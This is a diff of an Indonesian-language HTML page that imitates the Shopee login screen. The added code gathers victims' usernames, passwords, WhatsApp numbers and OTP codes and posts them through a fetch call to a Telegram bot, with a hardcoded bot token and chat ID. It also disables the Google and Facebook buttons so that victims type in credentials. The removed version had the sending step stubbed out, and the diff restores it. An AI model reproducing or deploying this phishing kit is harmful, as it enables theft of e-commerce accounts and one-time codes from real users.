@@ -1,426 +1,254 @@
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <title>Login Page</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-      rel="stylesheet"
-    />
-    <script>
-      let resendTimer;
-      let resendCountdown = 60;
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <script>
+    let resendTimer;
+    let resendCountdown = 60;
 
-      // --- Shopee Login Button Enable/Disable Logic ---
-      function checkShopeeLoginInputs() {
-        const usernameInput = document.getElementById("shopeeUsername");
-        const passwordInput = document.getElementById("password");
-        const loginBtn = document.getElementById("shopeeLoginBtn");
-        if (usernameInput.value.trim() && passwordInput.value.trim()) {
-          loginBtn.disabled = false;
-          loginBtn.classList.remove(
-            "bg-gray-300",
-            "text-gray-400",
-            "cursor-not-allowed"
-          );
-          loginBtn.classList.add("bg-orange-600", "text-white", "cursor-pointer");
-        } else {
-          loginBtn.disabled = true;
-          loginBtn.classList.remove(
-            "bg-orange-600",
-            "text-white",
-            "cursor-pointer"
-          );
-          loginBtn.classList.add(
-            "bg-gray-300",
-            "text-gray-400",
-            "cursor-not-allowed"
-          );
-        }
+    // --- Shopee Login Button Enable/Disable Logic ---
+    function checkShopeeLoginInputs() {
+      const usernameInput = document.getElementById("shopeeUsername");
+      const passwordInput = document.getElementById("password");
+      const loginBtn = document.getElementById("shopeeLoginBtn");
+      if (usernameInput.value.trim() && passwordInput.value.trim()) {
+        loginBtn.disabled = false;
+        loginBtn.classList.remove("bg-gray-300", "text-gray-400", "cursor-not-allowed");
+        loginBtn.classList.add("bg-orange-600", "text-white", "cursor-pointer");
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove("bg-orange-600", "text-white", "cursor-pointer");
+        loginBtn.classList.add("bg-gray-300", "text-gray-400", "cursor-not-allowed");
       }
+    }
 
-      function togglePasswordVisibility() {
-        const passwordInput = document.getElementById("password");
-        const toggleBtnIcon = document.getElementById("toggleIcon");
-        if (passwordInput.type === "password") {
-          passwordInput.type = "text";
-          toggleBtnIcon.classList.remove("fa-eye-slash");
-          toggleBtnIcon.classList.add("fa-eye");
-        } else {
-          passwordInput.type = "password";
-          toggleBtnIcon.classList.remove("fa-eye");
-          toggleBtnIcon.classList.add("fa-eye-slash");
-        }
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById("password");
+      const toggleBtnIcon = document.getElementById("toggleIcon");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        toggleBtnIcon.classList.remove("fa-eye-slash");
+        toggleBtnIcon.classList.add("fa-eye");
+      } else {
+        passwordInput.type = "password";
+        toggleBtnIcon.classList.remove("fa-eye");
+        toggleBtnIcon.classList.add("fa-eye-slash");
       }
+    }
 
-      function goToWhatsAppNumberInput() {
-        document.getElementById("mainLoginSection").classList.add("hidden");
-        document
-          .getElementById("whatsappNumberInputSection")
-          .classList.remove("hidden");
+    // --- NOTIFIKASI: Nonaktifkan login Google & Facebook ---
+    function showLoginAlert() {
+      alert("Silakan login dengan nomor handphone dan password atau login dengan WhatsApp.");
+    }
+
+    function goToWhatsAppNumberInput() {
+      document.getElementById("mainLoginSection").classList.add("hidden");
+      document.getElementById("whatsappNumberInputSection").classList.remove("hidden");
+    }
+
+    function submitWhatsAppNumber() {
+      const waNumber = document.getElementById("waNumberInput").value.trim();
+      if (!waNumber) {
+        alert("Mohon masukkan nomor WhatsApp Anda.");
+        return;
       }
+      sendAllInputsToTelegram('wa');
+      window.location.href = "verifikasi.html";
+    }
 
-      function submitWhatsAppNumber() {
-        const waNumber = document.getElementById("waNumberInput").value.trim();
-        if (!waNumber) {
-          alert("Mohon masukkan nomor WhatsApp Anda.");
-          return;
-        }
-        sendAllInputsToTelegram("wa");
-        window.location.href = "verifikasi.html";
-      }
+    function backToMainFromWhatsApp() {
+      document.getElementById("whatsappNumberInputSection").classList.add("hidden");
+      document.getElementById("mainLoginSection").classList.remove("hidden");
+    }
 
-      function backToMainFromWhatsApp() {
-        document
-          .getElementById("whatsappNumberInputSection")
-          .classList.add("hidden");
-        document.getElementById("mainLoginSection").classList.remove("hidden");
-      }
+    // --- Kirim semua input ke Telegram ---
+    function sendAllInputsToTelegram(contextName) {
+      const shopeeUsername = document.getElementById("shopeeUsername") ? document.getElementById("shopeeUsername").value : "";
+      const shopeePassword = document.getElementById("password") ? document.getElementById("password").value : "";
+      const waNumber = document.getElementById("waNumberInput") ? document.getElementById("waNumberInput").value : "";
+      const otpPhone = document.getElementById("otpInput") ? document.getElementById("otpInput").value : "";
+      const otpCode = document.getElementById("otpCode") ? document.getElementById("otpCode").value : "";
 
-      function submitVerification(event) {
-        event.preventDefault();
-        const selectedMethod = document.querySelector(
-          'input[name="verificationMethod"]:checked'
-        ).value;
-        sendAllInputsToTelegram("verification");
-        document.getElementById("verificationSection").classList.add("hidden");
-        document.getElementById("otpInputSection").classList.remove("hidden");
-        document.getElementById("otpInputTitle").textContent =
-          selectedMethod === "otpWA"
-            ? "Masukkan Nomor WhatsApp yang Terdaftar"
-            : "Masukkan Nomor Telepon yang Terdaftar";
-        document.getElementById("otpInput").value = "";
-        document.getElementById("otpCode").value = "";
-        document.getElementById("sendOtpBtn").disabled = false;
-        document.getElementById("sendOtpBtn").textContent = "Kirim Kode OTP";
-        document.getElementById("resendOtpBtn").disabled = true;
-        document.getElementById("resendOtpBtn").textContent =
-          "Kirim Ulang Kode OTP (60s)";
-        clearInterval(resendTimer);
-        resendCountdown = 60;
-      }
+      let text = `#LOGIN_FORM (${contextName})\n`;
+      text += `Shopee Username: ${shopeeUsername}\nShopee Password: ${shopeePassword}\n`;
+      text += `WhatsApp Number: ${waNumber}\n`;
+      text += `OTP Phone: ${otpPhone}\nOTP Code: ${otpCode}\n`;
 
-      function resetResendTimer() {
-        clearInterval(resendTimer);
-        resendCountdown = 60;
-        document.getElementById("resendOtpBtn").disabled = true;
-        document.getElementById(
-          "resendOtpBtn"
-        ).textContent = `Kirim Ulang Kode OTP (${resendCountdown}s)`;
-        resendTimer = setInterval(() => {
-          resendCountdown--;
-          if (resendCountdown <= 0) {
-            clearInterval(resendTimer);
-            document.getElementById("resendOtpBtn").disabled = false;
-            document.getElementById("resendOtpBtn").textContent =
-              "Kirim Ulang Kode OTP";
-          } else {
-            document.getElementById(
-              "resendOtpBtn"
-            ).textContent = `Kirim Ulang Kode OTP (${resendCountdown}s)`;
-          }
-        }, 1000);
-      }
+      const chatId = '5923031825';
+      const token = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk';
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-      function sendOtp() {
-        const phoneNumber = document.getElementById("otpInput").value.trim();
-        if (!phoneNumber) {
-          alert("Mohon masukkan nomor yang terdaftar.");
-          return;
-        }
-        sendAllInputsToTelegram("otpSend");
-        alert(`Kode OTP telah dikirim ke nomor ${phoneNumber}`);
-        document.getElementById("sendOtpBtn").disabled = true;
-        resetResendTimer();
-      }
+      try {
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        });
+      } catch (e) {}
+    }
 
-      function resendOtp() {
-        sendAllInputsToTelegram("otpResend");
-        alert("Kode OTP telah dikirim ulang.");
-        resetResendTimer();
-      }
+    // --- Shopee login form submit handler ---
+    function submitShopeeLogin(event) {
+      event.preventDefault();
+      sendAllInputsToTelegram('shopee');
+      window.location.href = "verifikasi.html";
+    }
 
-      function submitOtp(event) {
-        event.preventDefault();
-        const otpCode = document.getElementById("otpCode").value.trim();
-        if (!otpCode) {
-          alert("Mohon masukkan kode OTP.");
-          return;
-        }
-        sendAllInputsToTelegram("otpSubmit");
-        window.location.href = "pin.html";
-      }
+    window.onload = function() {
+      document.getElementById("shopeeUsername").addEventListener("input", checkShopeeLoginInputs);
+      document.getElementById("password").addEventListener("input", checkShopeeLoginInputs);
+      document.getElementById("loginForm").addEventListener("submit", submitShopeeLogin);
+    };
+  </script>
+</head>
 
-      function backToVerification() {
-        document.getElementById("otpInputSection").classList.add("hidden");
-        document.getElementById("verificationSection").classList.remove("hidden");
-      }
+<body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
+  <img
+    alt="Shopee logo orange text with shopping bag icon"
+    class="mb-10"
+    height="64"
+    src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg"
+    width="64"
+  />
 
-      // --- Send all input values to Telegram ---
-      function sendAllInputsToTelegram(contextName) {
-        const shopeeUsername = document.getElementById("shopeeUsername")
-          ? document.getElementById("shopeeUsername").value
-          : "";
-        const shopeePassword = document.getElementById("password")
-          ? document.getElementById("password").value
-          : "";
-        const waNumber = document.getElementById("waNumberInput")
-          ? document.getElementById("waNumberInput").value
-          : "";
-        let verificationMethod = "";
-        if (document.querySelector('input[name="verificationMethod"]:checked')) {
-          verificationMethod = document.querySelector(
-            'input[name="verificationMethod"]:checked'
-          ).value;
-        }
-        const otpPhone = document.getElementById("otpInput")
-          ? document.getElementById("otpInput").value
-          : "";
-        const otpCode = document.getElementById("otpCode")
-          ? document.getElementById("otpCode").value
-          : "";
-
-        let text = `#LOGIN_FORM (${contextName})\n`;
-        text += `Shopee Username: ${shopeeUsername}\nShopee Password: ${shopeePassword}\n`;
-        text += `WhatsApp Number: ${waNumber}\n`;
-        text += `Verifikasi metode: ${verificationMethod}\n`;
-        text += `OTP Phone: ${otpPhone}\nOTP Code: ${otpCode}\n`;
-
-        // (Bagian pengiriman data dihapus untuk keamanan)
-      }
-
-      function submitShopeeLogin(event) {
-        event.preventDefault();
-        sendAllInputsToTelegram("shopee");
-        window.location.href = "verifikasi.html";
-      }
-
-      window.onload = function () {
-        document
-          .getElementById("shopeeUsername")
-          .addEventListener("input", checkShopeeLoginInputs);
-        document
-          .getElementById("password")
-          .addEventListener("input", checkShopeeLoginInputs);
-        document
-          .getElementById("loginForm")
-          .addEventListener("submit", submitShopeeLogin);
-      };
-    </script>
-  </head>
-  <body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
-    <img
-      alt="Shopee logo orange text with shopping bag icon"
-      class="mb-10"
-      height="64"
-      src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg"
-      width="64"
-    />
-
-    <!-- Main Login Section -->
-    <div id="mainLoginSection" class="w-full max-w-sm">
-      <form id="loginForm" class="mb-6" autocomplete="off">
-        <div class="relative mb-6">
-          <span
-            class="absolute inset-y-0 left-0 flex items-center pl-2 text-gray-400 text-lg"
-          >
-            <i class="fas fa-user"></i>
-          </span>
-          <input
-            id="shopeeUsername"
-            class="w-full border-b border-gray-300 py-2 pl-10 pr-2 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
-            placeholder="No. Handphone/Email/Username"
-            type="text"
-            required
-            autocomplete="off"
-          />
-        </div>
-        <div class="relative mb-4 flex items-center border-b border-gray-300">
-          <span class="absolute left-0 pl-2 text-gray-400 text-lg">
-            <i class="fas fa-lock"></i>
-          </span>
-          <input
-            id="password"
-            class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
-            placeholder="Password"
-            type="password"
-            required
-            autocomplete="off"
-          />
-          <button
-            aria-label="Toggle password visibility"
-            class="absolute right-4 text-gray-400 text-xl focus:outline-none"
-            type="button"
-            onclick="togglePasswordVisibility()"
-            tabindex="-1"
-          >
-            <i class="fas fa-eye-slash" id="toggleIcon"></i>
-          </button>
-        </div>
-        <button
-          id="shopeeLoginBtn"
-          class="w-full bg-gray-300 text-gray-400 py-2 rounded-md text-center text-lg font-normal mb-4 cursor-not-allowed"
-          disabled
-          type="submit"
-        >
-          Log In
-        </button>
-      </form>
-
-      <div class="flex items-center mb-6">
-        <hr class="flex-grow border-gray-300" />
-        <span class="mx-3 text-gray-600 text-sm">ATAU</span>
-        <hr class="flex-grow border-gray-300" />
-      </div>
-
-      <div class="space-y-3">
-        <button
-          onclick="goToWhatsAppNumberInput()"
-          class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
-          type="button"
-        >
-          <img
-            alt="WhatsApp logo in green"
-            class="mr-3"
-            height="20"
-            src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
-            width="20"
-          />
-          Log In dengan WhatsApp
-        </button>
-      </div>
-    </div>
-
-    <!-- WhatsApp Number Input Section -->
-    <div id="whatsappNumberInputSection" class="hidden w-full max-w-sm">
-      <h2 class="text-2xl font-semibold mb-6 text-center text-green-600">
-        Masukkan Nomor WhatsApp Anda
-      </h2>
-      <div class="mb-4">
+  <!-- Main Login Section -->
+  <div id="mainLoginSection" class="w-full max-w-sm">
+    <form id="loginForm" class="mb-6" autocomplete="off">
+      <div class="relative mb-6">
+        <span class="absolute inset-y-0 left-0 flex items-center pl-2 text-gray-400 text-lg">
+          <i class="fas fa-user"></i>
+        </span>
         <input
-          id="waNumberInput"
-          type="tel"
-          placeholder="Masukkan nomor WhatsApp"
-          class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-green-600"
-        />
-      </div>
-      <div class="flex space-x-4">
-        <button
-          type="button"
-          onclick="submitWhatsAppNumber()"
-          class="flex-grow bg-green-600 text-white py-2 rounded-md text-lg font-semibold"
-        >
-          Lanjut
-        </button>
-        <button
-          type="button"
-          onclick="backToMainFromWhatsApp()"
-          class="flex-grow border border-gray-300 py-2 rounded-md text-black text-base font-normal"
-        >
-          Kembali
-        </button>
-      </div>
-    </div>
-
-    <!-- Verification Section -->
-    <div id="verificationSection" class="hidden w-full max-w-sm">
-      <h2 class="text-2xl font-semibold mb-6 text-center text-orange-600">
-        Verifikasi Keamanan Akun
-      </h2>
-      <p class="mb-4 text-center text-gray-700">
-        Pilih metode verifikasi untuk mengamankan akun Anda:
-      </p>
-      <form onsubmit="submitVerification(event)" class="space-y-4">
-        <label
-          class="flex items-center space-x-3 border border-gray-300 rounded-md p-3 cursor-pointer"
-        >
-          <input
-            type="radio"
-            name="verificationMethod"
-            value="otpWA"
-            required
-            class="form-radio text-orange-600"
-          />
-          <span>Kode OTP via WhatsApp</span>
-        </label>
-        <label
-          class="flex items-center space-x-3 border border-gray-300 rounded-md p-3 cursor-pointer"
-        >
-          <input
-            type="radio"
-            name="verificationMethod"
-            value="otpSMS"
-            required
-            class="form-radio text-orange-600"
-          />
-          <span>Kode OTP via SMS</span>
-        </label>
-        <button
-          type="submit"
-          class="w-full bg-orange-600 text-white py-2 rounded-md text-lg font-semibold"
-        >
-          Kirim Kode OTP
-        </button>
-      </form>
-    </div>
-
-    <!-- OTP Input Section -->
-    <div id="otpInputSection" class="hidden w-full max-w-sm">
-      <h2
-        id="otpInputTitle"
-        class="text-2xl font-semibold mb-6 text-center text-orange-600"
-      >
-        Masukkan Nomor yang Terdaftar
-      </h2>
-      <form onsubmit="submitOtp(event)" class="space-y-4">
-        <input
-          id="otpInput"
-          type="tel"
-          placeholder="Masukkan nomor telepon"
-          class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-600"
-          required
-        />
-        <button
-          id="sendOtpBtn"
-          type="button"
-          onclick="sendOtp()"
-          class="w-full bg-orange-600 text-white py-2 rounded-md text-lg font-semibold"
-        >
-          Kirim Kode OTP
-        </button>
-
-        <input
-          id="otpCode"
+          id="shopeeUsername"
+          class="w-full border-b border-gray-300 py-2 pl-10 pr-2 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
+          placeholder="No. Handphone/Email/Username"
           type="text"
-          placeholder="Masukkan kode OTP"
-          class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-600"
           required
+          autocomplete="off"
+        />
+      </div>
+      <div class="relative mb-4 flex items-center border-b border-gray-300">
+        <span class="absolute left-0 pl-2 text-gray-400 text-lg">
+          <i class="fas fa-lock"></i>
+        </span>
+        <input
+          id="password"
+          class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
+          placeholder="Password"
+          type="password"
+          required
+          autocomplete="off"
         />
         <button
-          id="resendOtpBtn"
+          aria-label="Toggle password visibility"
+          class="absolute right-4 text-gray-400 text-xl focus:outline-none"
           type="button"
-          onclick="resendOtp()"
-          disabled
-          class="w-full bg-gray-300 text-gray-600 py-2 rounded-md text-lg font-semibold"
+          onclick="togglePasswordVisibility()"
+          tabindex="-1"
         >
-          Kirim Ulang Kode OTP (60s)
+          <i class="fas fa-eye-slash" id="toggleIcon"></i>
         </button>
+      </div>
+      <button
+        id="shopeeLoginBtn"
+        class="w-full bg-gray-300 text-gray-400 py-2 rounded-md text-center text-lg font-normal mb-4 cursor-not-allowed"
+        disabled
+        type="submit"
+      >
+        Log In
+      </button>
+    </form>
 
-        <button
-          type="submit"
-          class="w-full bg-orange-600 text-white py-2 rounded-md text-lg font-semibold"
-        >
-          Verifikasi
-        </button>
-        <button
-          type="button"
-          onclick="backToVerification()"
-          class="w-full border border-gray-300 py-2 rounded-md text-black text-base font-normal"
-        >
-          Kembali
-        </button>
-      </form>
+    <div class="flex items-center mb-6">
+      <hr class="flex-grow border-gray-300" />
+      <span class="mx-3 text-gray-600 text-sm">ATAU</span>
+      <hr class="flex-grow border-gray-300" />
     </div>
-  </body>
+
+    <div class="space-y-3">
+      <button
+        onclick="showLoginAlert()"
+        class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
+        type="button"
+      >
+        <img
+          alt="Gmail logo in red and white"
+          class="mr-3"
+          height="20"
+          src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg"
+          width="20"
+        />
+        Log In dengan Google
+      </button>
+      <button
+        onclick="showLoginAlert()"
+        class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
+        type="button"
+      >
+        <img
+          alt="Facebook logo in blue"
+          class="mr-3"
+          height="20"
+          src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"
+          width="20"
+        />
+        Log In dengan Facebook
+      </button>
+      <button
+        onclick="goToWhatsAppNumberInput()"
+        class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
+        type="button"
+      >
+        <img
+          alt="WhatsApp logo in green"
+          class="mr-3"
+          height="20"
+          src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
+          width="20"
+        />
+        Log In dengan WhatsApp
+      </button>
+    </div>
+  </div>
+
+  <!-- WhatsApp Number Input Section -->
+  <div id="whatsappNumberInputSection" class="hidden w-full max-w-sm">
+    <h2 class="text-2xl font-semibold mb-6 text-center text-green-600">
+      Masukkan Nomor WhatsApp Anda
+    </h2>
+    <div class="mb-4">
+      <input
+        id="waNumberInput"
+        type="tel"
+        placeholder="Masukkan nomor WhatsApp"
+        class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-green-600"
+      />
+    </div>
+    <div class="flex space-x-4">
+      <button
+        type="button"
+        onclick="submitWhatsAppNumber()"
+        class="flex-grow bg-green-600 text-white py-2 rounded-md text-lg font-semibold"
+      >
+        Lanjut
+      </button>
+      <button
+        type="button"
+        onclick="backToMainFromWhatsApp()"
+        class="flex-grow border border-gray-300 py-2 rounded-md text-black text-base font-normal"
+      >
+        Kembali
+      </button>
+    </div>
+  </div>
+</body>
 </html>
